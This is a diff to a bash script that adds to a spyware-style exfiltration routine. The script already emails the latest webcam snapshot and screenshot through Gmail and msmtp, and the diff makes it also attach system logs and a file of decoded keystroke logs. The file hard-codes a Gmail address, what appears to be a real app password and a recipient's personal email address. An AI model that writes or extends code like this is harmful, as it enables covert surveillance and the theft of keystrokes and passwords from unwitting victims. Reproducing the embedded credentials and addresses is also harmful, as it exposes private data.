@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Ensure the script is executable
+SCRIPT_PATH=$(realpath "$0")
+chmod +x "$SCRIPT_PATH"
+
 # Gmail credentials
 EMAIL="testshell975@gmail.com"
 APP_PASSWORD="ohvj mvfn sgus nfaq"  # Replace with your app password
@@ -7,18 +11,18 @@ APP_PASSWORD="ohvj mvfn sgus nfaq"  # Replace with your app password
 # Email content
 TO_EMAIL="narcis.karanfilov@gmail.com"  # Replace with the recipient's email
 SUBJECT="PRISM Snapshot"
-BODY="Attached are the latest snapshots."
+BODY="Attached are the latest snapshots, system diagnostics, and key log files."
 
 # Directory for logs and captures
 CAPTURE_DIR="./logs/captures"
+SYSTEM_LOGS_DIR="./logs/system_logs"
+DECRYPTED_LOGS_DIR="./logs/decrypted_key_logs"
+DECODED_LOG_FILE="$DECRYPTED_LOGS_DIR/decoded_key_logs.txt"
 
-# Find the latest camera snapshot and screenshot based on modification time
+# Find the latest camera snapshot, screenshot, and system diagnostics log based on modification time
 CAMERA_SNAPSHOT=$(ls -t "$CAPTURE_DIR"/camera_snapshot_*.jpg 2>/dev/null | head -n 1)
 SCREENSHOT=$(ls -t "$CAPTURE_DIR"/screenshot_*.png 2>/dev/null | head -n 1)
-
-# Debug: Print paths
-echo "Latest camera snapshot: $CAMERA_SNAPSHOT"
-echo "Latest screenshot: $SCREENSHOT"
+SYSTEM_DIAGNOSTICS=$(ls -t "$SYSTEM_LOGS_DIR"/system_logs_*.log 2>/dev/null | head -n 1)
 
 # Check if the files exist
 if [[ ! -f "$CAMERA_SNAPSHOT" ]]; then
@@ -28,6 +32,16 @@ fi
 
 if [[ ! -f "$SCREENSHOT" ]]; then
     echo "Error: No screenshot file found in $CAPTURE_DIR"
+    exit 1
+fi
+
+if [[ ! -f "$SYSTEM_DIAGNOSTICS" ]]; then
+    echo "Error: No system diagnostics file found in $SYSTEM_LOGS_DIR"
+    exit 1
+fi
+
+if [[ ! -f "$DECODED_LOG_FILE" ]]; then
+    echo "Error: No decoded key log file found at $DECODED_LOG_FILE"
     exit 1
 fi
 
@@ -80,6 +94,20 @@ fi
     echo "Content-Transfer-Encoding: base64"
     echo ""
     base64 "$SCREENSHOT"
+    echo ""
+    echo "--boundary1"
+    echo "Content-Type: text/plain; name=\"system_diagnostics.log\""
+    echo "Content-Disposition: attachment; filename=\"system_diagnostics.log\""
+    echo "Content-Transfer-Encoding: base64"
+    echo ""
+    base64 "$SYSTEM_DIAGNOSTICS"
+    echo ""
+    echo "--boundary1"
+    echo "Content-Type: text/plain; name=\"decoded_key_logs.txt\""
+    echo "Content-Disposition: attachment; filename=\"decoded_key_logs.txt\""
+    echo "Content-Transfer-Encoding: base64"
+    echo ""
+    base64 "$DECODED_LOG_FILE"
     echo ""
     echo "--boundary1--"
 ) | msmtp --from=default -t "$TO_EMAIL"
